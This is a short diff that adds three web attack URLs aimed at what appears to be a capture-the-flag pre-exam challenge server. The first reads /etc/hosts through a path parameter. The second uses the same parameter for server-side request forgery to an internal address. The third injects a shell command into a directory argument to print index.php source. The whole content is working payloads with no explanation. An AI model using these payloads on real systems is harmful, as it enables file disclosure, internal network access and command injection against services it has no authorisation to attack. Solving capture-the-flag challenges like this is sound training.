@@ -1,0 +1,3 @@
+http://pre-exam-web.ais3.org:10103/?path=/etc/hosts
+http://pre-exam-web.ais3.org:10103/?path=http://root@172.22.0.2/?dir=./
+http://pre-exam-web.ais3.org:10103/?path=http://root@172.22.0.2/?dir=./%27;cat%3C%27index.php
